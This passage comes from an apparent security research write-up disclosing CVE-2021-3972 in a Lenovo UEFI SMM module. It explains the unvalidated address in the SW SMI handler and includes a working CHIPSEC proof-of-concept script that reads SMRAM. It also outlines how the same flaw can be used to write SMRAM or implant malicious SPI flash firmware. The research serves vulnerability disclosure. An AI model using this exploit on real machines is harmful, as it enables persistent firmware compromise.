100vw, 945px" /></a><p class="wp-caption-text"><em>Figure 15. Hex-Rays-decompiled code of SW SMI handler function registered by the </em><span style="font-family: courier new, courier, monospace;">LenovoVariableSmm</span> <em>module</em></p></div>
<p>Looking closely at the SW SMI handler function in Figure 15, we see that it begins with reading the user parameters from the CPU saved state registers ‚Äì which are registers saved at the moment of SMI invocation.</p>
<p>These two arguments are being read:</p>
<ol>
<li>64-bit physical address built from the values stored in the <span style="font-family: 'courier new', courier, monospace;">ECX</span> and <span style="font-family: 'courier new', courier, monospace;">EDI</span> registers<span style="font-family: georgia, palatino, serif;">.</span></li>
<li>The command, indicating the action to be executed (read, write, delete, etc.), from the <span style="font-family: 'courier new', courier, monospace;">BX</span> register.</li>
</ol>
<p>This physical address passed as an argument to the SMI handler should contain data identifying the Lenovo variable to be read or written; the structure of this buffer is shown in Figure 16.</p>
<div id="attachment_161475" style="width: 810px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-16.-Structure-of-the-buffer-passed-to-the-LenovoVariableSmm-SW-SMI-handler.png"><img class="wp-image-161475" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-16.-Structure-of-the-buffer-passed-to-the-LenovoVariableSmm-SW-SMI-handler-300x144.png" alt="" width="800" height="383" srcset="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-16.-Structure-of-the-buffer-passed-to-the-LenovoVariableSmm-SW-SMI-handler-300x144.png 300w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-16.-Structure-of-the-buffer-passed-to-the-LenovoVariableSmm-SW-SMI-handler-768x367.png 768w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-16.-Structure-of-the-buffer-passed-to-the-LenovoVariableSmm-SW-SMI-handler-1024x490.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-16.-Structure-of-the-buffer-passed-to-the-LenovoVariableSmm-SW-SMI-handler.png 1085w" sizes="(max-width: 800px) 100vw, 800px" /></a><p class="wp-caption-text"><em>Figure 16. Structure of the buffer passed to the</em> <span style="font-family: courier new, courier, monospace;">LenovoVariableSmm</span> <em>SW SMI handler</em></p></div>
<p>The buffer starts with the 0x20-byte header (<span style="font-family: 'courier new', courier, monospace;">LENV_HDR</span>), containing the unique GUID that identifies the Lenovo variable and a 32-bit value specifying the length of the data to be retrieved from the variable or written to it. The memory space located immediately after the header is used as a source or destination location for <span style="font-family: 'courier new', courier, monospace;">LENOVO_VARIABLE_PROTOCOL</span>‚Äôs Read and Write functions.</p>
<p>The problem is, the physical address provided by the caller is not validated or checked in any way and it‚Äôs directly passed as an argument to the <span style="font-family: 'courier new', courier, monospace;">LENOVO_VARIABLE_PROTOCOL</span> functions (see line 41 in Figure 15). This allows an attacker to pass any physical address ‚Äì including an address from the SMRAM range.</p>
<p>But how could this be used by an attacker to read/write from/into the SMRAM? To read the SMRAM content, the following steps are required:</p>
<ol>
<li>Find the SMRAM physical address.</li>
<li>Copy the <span style="font-family: 'courier new', courier, monospace;">LENV_HDR</span> header to the physical address 32 bytes before the SMRAM ‚Äì the header should contain a variable identifier (it can be a random GUID) and the length of the data one would like to read from SMRAM (the maximum is something below 4KB).</li>
<li>Invoke SW SMI registered by the <span style="font-family: 'courier new', courier, monospace;">LenovoVariableSmm</span> (<span style="font-family: 'courier new', courier, monospace;">SwSmiNumber</span> 0x80), specifying the command with ID 0x02 in the <span style="font-family: 'courier new', courier, monospace;">BX</span> register (meaning that you want to write into the Lenovo variable) and the address of previously created header in the <span style="font-family: 'courier new', courier, monospace;">ECX</span> and <span style="font-family: 'courier new', courier, monospace;">EDI</span> registers (to tell the SW SMI handler <strong>what</strong> you want to write into that variable).</li>
<li>Now, that variable contains a specified amount of SMRAM data ‚Äì so we only need to read it. We allocate a new buffer (equal to the size of the header plus the size of data to retrieve) and copy the same header into it, as used in step 2.</li>
<li>Invoke the SW SMI handler again, specifying the command with ID 0x01 in BX register (meaning that you want to read from the Lenovo variable) and the address of our newly allocated buffer from step 4 in the <span style="font-family: 'courier new', courier, monospace;">ECX</span> and <span style="font-family: 'courier new', courier, monospace;">EDI</span> registers (to tell the SW SMI handler <strong>where</strong> we want to copy the content of the Lenovo variable ‚Äì which at this moment contains data from the SMRAM).</li>
</ol>
<p>An example of the above-described steps using the CHIPSEC framework is shown in Figure 17; the output of the script containing the first 0x100 bytes of the SMRAM is shown in Figure 18.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-625eed6ab226f778477398" class="crayon-syntax crayon-theme-classic crayon-font-consolas crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 10px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 10px !important; line-height: 15px !important;">
import binascii
import struct
import chipsec.chipset
from chipsec.hal.interrupts import Interrupts
from hexdump import hexdump

cs = chipsec.chipset.cs()
cs.init(None, None, True, True)
intr = Interrupts(cs)
mem_read = cs.helper.read_physical_mem
mem_write = cs.helper.write_physical_mem
mem_alloc = cs.helper.alloc_physical_mem

# 1. get SMRAM physical address
smram_addr = cs.cpu.get_SMRAM()[0]
HDR_SZ = 0x20
VAR_SIZE = 0x100
VAR_GUID = binascii.unhexlify("55 57 0e C2 69 11 56 4c a4 8a 98 24 ab 43 05 00".replace(" ", ""))
SMI_NUM = 0x80

# 2. write header to the physical memory just before the SMRAM
phys_buff = smram_addr-HDR_SZ
hdr = b"\x00\x00" + VAR_GUID + 10*b"\x00" + struct.pack("&lt;I", VAR_SIZE)
mem_write(phys_buff, HDR_SZ, hdr)

# 3. invoke Lenovo variable SW SMI handler to write first VAR_SIZE SMRAM 
# bytes into VAR_GUID Lenovo variable 
high = (phys_buff &gt;&gt; 32) &amp; 0xFFFFFFFF
low = phys_buff &amp; 0xFFFFFFFF
_rcx = low
_rbx = 2 #WRITE LENOVO VARIABLE
_rdx = 0xB2
_rax = 0x5380
_rdi = high
intr.send_SW_SMI(0, SMI_NUM, 0x53, _rax, _rbx, _rcx, _rdx, 0, _rdi)

# 4. allocate memory for the data read from variable
# write header to the beginning of the allocated memory
# zeroe the rest of the buffer
sz_to_alloc = VAR_SIZE + HDR_SZ
_va, out_buff = mem_alloc(sz_to_alloc, 0xFFFFFFFF)
mem_write(out_buff, HDR_SZ, hdr)
mem_write(out_buff+HDR_SZ, VAR_SIZE, VAR_SIZE*b"\x00")

# 5. invoke Lenovo variable SW SMI handler to read previously created
# variable directly into our buffer
high = (out_buff &gt;&gt; 32) &amp; 0xFFFFFFFFFFFFFFFF
low = out_buff &amp; 0xFFFFFFFF
_rcx = low
_rbx = 1 #READ LENOVO VARIABLE
_rdx = 0xB2
_rax = 0x5380
_rdi = high
result = intr.send_SW_SMI(0, SMI_NUM, 0x53, _rax, _rbx, _rcx, _rdx, 0, _rdi)

# print first VAR_SIZE bytes from SMRAM
smram_data = mem_read(out_buff+HDR_SZ, VAR_SIZE)
hexdump(smram_data)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 10px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-1">1</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-2">2</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-3">3</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-4">4</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-5">5</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-6">6</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-7">7</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-8">8</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-9">9</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-10">10</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-11">11</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-12">12</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-13">13</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-14">14</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-15">15</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-16">16</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-17">17</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-18">18</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-19">19</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-20">20</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-21">21</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-22">22</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-23">23</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-24">24</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-25">25</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-26">26</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-27">27</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-28">28</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-29">29</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-30">30</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-31">31</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-32">32</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-33">33</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-34">34</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-35">35</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-36">36</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-37">37</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-38">38</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-39">39</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-40">40</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-41">41</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-42">42</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-43">43</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-44">44</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-45">45</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-46">46</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-47">47</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-48">48</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-49">49</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-50">50</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-51">51</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-52">52</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-53">53</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-54">54</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-55">55</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-56">56</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-57">57</div><div class="crayon-num" data-line="crayon-625eed6ab226f778477398-58">58</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 10px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-625eed6ab226f778477398-1"><span class="crayon-e">import </span><span class="crayon-e">binascii</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-2"><span class="crayon-e">import </span><span class="crayon-t">struct</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-3"><span class="crayon-e">import </span><span class="crayon-v">chipsec</span><span class="crayon-sy">.</span><span class="crayon-e">chipset</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-4"><span class="crayon-e">from </span><span class="crayon-v">chipsec</span><span class="crayon-sy">.</span><span class="crayon-v">hal</span><span class="crayon-sy">.</span><span class="crayon-e">interrupts </span><span class="crayon-e">import </span><span class="crayon-e">Interrupts</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-5"><span class="crayon-e">from </span><span class="crayon-e">hexdump </span><span class="crayon-e">import </span><span class="crayon-e">hexdump</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-6">&nbsp;</div><div class="crayon-line" id="crayon-625eed6ab226f778477398-7"><span class="crayon-v">cs</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">chipsec</span><span class="crayon-sy">.</span><span class="crayon-v">chipset</span><span class="crayon-sy">.</span><span class="crayon-e">cs</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-8"><span class="crayon-v">cs</span><span class="crayon-sy">.</span><span class="crayon-e">init</span><span class="crayon-sy">(</span><span class="crayon-v">None</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">None</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">True</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">True</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-9"><span class="crayon-v">intr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">Interrupts</span><span class="crayon-sy">(</span><span class="crayon-v">cs</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-10"><span class="crayon-v">mem_read</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">cs</span><span class="crayon-sy">.</span><span class="crayon-v">helper</span><span class="crayon-sy">.</span><span class="crayon-e">read_physical_mem</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-11"><span class="crayon-v">mem_write</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">cs</span><span class="crayon-sy">.</span><span class="crayon-v">helper</span><span class="crayon-sy">.</span><span class="crayon-e">write_physical_mem</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-12"><span class="crayon-v">mem_alloc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">cs</span><span class="crayon-sy">.</span><span class="crayon-v">helper</span><span class="crayon-sy">.</span><span class="crayon-v">alloc_physical_mem</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-13">&nbsp;</div><div class="crayon-line" id="crayon-625eed6ab226f778477398-14"><span class="crayon-p"># 1. get SMRAM physical address</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-15"><span class="crayon-v">smram_addr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">cs</span><span class="crayon-sy">.</span><span class="crayon-v">cpu</span><span class="crayon-sy">.</span><span class="crayon-e">get_SMRAM</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-16"><span class="crayon-v">HDR_SZ</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x20</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-17"><span class="crayon-v">VAR_SIZE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x100</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-18"><span class="crayon-v">VAR_GUID</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">binascii</span><span class="crayon-sy">.</span><span class="crayon-e">unhexlify</span><span class="crayon-sy">(</span><span class="crayon-s">"55 57 0e C2 69 11 56 4c a4 8a 98 24 ab 43 05 00"</span><span class="crayon-sy">.</span><span class="crayon-e">replace</span><span class="crayon-sy">(</span><span class="crayon-s">" "</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-19"><span class="crayon-v">SMI_NUM</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x80</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-20">&nbsp;</div><div class="crayon-line" id="crayon-625eed6ab226f778477398-21"><span class="crayon-p"># 2. write header to the physical memory just before the SMRAM</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-22"><span class="crayon-v">phys_buff</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">smram_addr</span><span class="crayon-o">-</span><span class="crayon-e">HDR_SZ</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-23"><span class="crayon-v">hdr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">b</span><span class="crayon-s">"\x00\x00"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">VAR_GUID</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">10</span><span class="crayon-o">*</span><span class="crayon-i">b</span><span class="crayon-s">"\x00"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-t">struct</span><span class="crayon-sy">.</span><span class="crayon-e">pack</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;I"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">VAR_SIZE</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-24"><span class="crayon-e">mem_write</span><span class="crayon-sy">(</span><span class="crayon-v">phys_buff</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">HDR_SZ</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">hdr</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-25">&nbsp;</div><div class="crayon-line" id="crayon-625eed6ab226f778477398-26"><span class="crayon-p"># 3. invoke Lenovo variable SW SMI handler to write first VAR_SIZE SMRAM </span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-27"><span class="crayon-p"># bytes into VAR_GUID Lenovo variable </span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-28"><span class="crayon-v">high</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">phys_buff</span><span class="crayon-h"> </span><span class="crayon-o">&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">32</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0xFFFFFFFF</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-29"><span class="crayon-v">low</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">phys_buff</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0xFFFFFFFF</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-30"><span class="crayon-v">_rcx</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">low</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-31"><span class="crayon-v">_rbx</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-p">#WRITE LENOVO VARIABLE</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-32"><span class="crayon-v">_rdx</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0xB2</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-33"><span class="crayon-v">_rax</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x5380</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-34"><span class="crayon-v">_rdi</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">high</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-35"><span class="crayon-v">intr</span><span class="crayon-sy">.</span><span class="crayon-e">send_SW_SMI</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">SMI_NUM</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x53</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">_rax</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">_rbx</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">_rcx</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">_rdx</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">_rdi</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-36">&nbsp;</div><div class="crayon-line" id="crayon-625eed6ab226f778477398-37"><span class="crayon-p"># 4. allocate memory for the data read from variable</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-38"><span class="crayon-p"># write header to the beginning of the allocated memory</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-39"><span class="crayon-p"># zeroe the rest of the buffer</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-40"><span class="crayon-v">sz_to_alloc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">VAR_SIZE</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-e">HDR_SZ</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-41"><span class="crayon-v">_va</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">out_buff</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mem_alloc</span><span class="crayon-sy">(</span><span class="crayon-v">sz_to_alloc</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0xFFFFFFFF</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-42"><span class="crayon-e">mem_write</span><span class="crayon-sy">(</span><span class="crayon-v">out_buff</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">HDR_SZ</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">hdr</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-43"><span class="crayon-e">mem_write</span><span class="crayon-sy">(</span><span class="crayon-v">out_buff</span><span class="crayon-o">+</span><span class="crayon-v">HDR_SZ</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">VAR_SIZE</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e ">VAR_SIZE*</span><span class="crayon-i">b</span><span class="crayon-s">"\x00"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-44">&nbsp;</div><div class="crayon-line" id="crayon-625eed6ab226f778477398-45"><span class="crayon-p"># 5. invoke Lenovo variable SW SMI handler to read previously created</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-46"><span class="crayon-p"># variable directly into our buffer</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-47"><span class="crayon-v">high</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">out_buff</span><span class="crayon-h"> </span><span class="crayon-o">&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">32</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0xFFFFFFFFFFFFFFFF</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-48"><span class="crayon-v">low</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">out_buff</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0xFFFFFFFF</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-49"><span class="crayon-v">_rcx</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">low</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-50"><span class="crayon-v">_rbx</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-p">#READ LENOVO VARIABLE</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-51"><span class="crayon-v">_rdx</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0xB2</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-52"><span class="crayon-v">_rax</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x5380</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-53"><span class="crayon-v">_rdi</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">high</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-54"><span class="crayon-v">result</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">intr</span><span class="crayon-sy">.</span><span class="crayon-e">send_SW_SMI</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">SMI_NUM</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x53</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">_rax</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">_rbx</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">_rcx</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">_rdx</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">_rdi</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-55">&nbsp;</div><div class="crayon-line" id="crayon-625eed6ab226f778477398-56"><span class="crayon-p"># print first VAR_SIZE bytes from SMRAM</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-57"><span class="crayon-v">smram_data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mem_read</span><span class="crayon-sy">(</span><span class="crayon-v">out_buff</span><span class="crayon-o">+</span><span class="crayon-v">HDR_SZ</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">VAR_SIZE</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-625eed6ab226f778477398-58"><span class="crayon-e">hexdump</span><span class="crayon-sy">(</span><span class="crayon-v">smram_data</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0008 seconds] -->
<p><em>Figure 17. CHIPSEC example ‚Äì read 0x100 bytes from SMRAM by exploiting CVE-2021-3972</em></p>
<div id="attachment_161476" style="width: 953px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-18.-CHIPSEC-script-output-dumping-the-first-0x100-bytes-of-SMRAM.png"><img class="wp-image-161476 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-18.-CHIPSEC-script-output-dumping-the-first-0x100-bytes-of-SMRAM.png" alt="" width="943" height="754" srcset="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-18.-CHIPSEC-script-output-dumping-the-first-0x100-bytes-of-SMRAM.png 943w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-18.-CHIPSEC-script-output-dumping-the-first-0x100-bytes-of-SMRAM-300x240.png 300w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-18.-CHIPSEC-script-output-dumping-the-first-0x100-bytes-of-SMRAM-768x614.png 768w, https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-18.-CHIPSEC-script-output-dumping-the-first-0x100-bytes-of-SMRAM-222x179.png 222w" sizes="(max-width: 943px) 100vw, 943px" /></a><p class="wp-caption-text"><em>Figure 18. CHIPSEC script output dumping the first 0x100 bytes of SMRAM</em></p></div>
<p>To be able to write into SMRAM, the principle is almost the same ‚Äì first, the attackers need to write their own data into the Lenovo variable, and then read the data from the variable directly to the SMRAM.</p>
<p>We have provided an example of how to read only the first 0x100 bytes of the SMRAM; however, with additional modifications, it‚Äôs possible to read/write the whole SMRAM range. This could allow threat actors to execute their own malicious code in SMM or even worse ‚Äì considering the <span style="font-family: 'courier new', courier, monospace;">LenovoVariable</span> SW SMI handler‚Äôs ability to modify the SPI flash ‚Äì write the attackers‚Äô own malicious firmware implant directly to the SPI flash.</p>
<h2>Conclusion</h2>
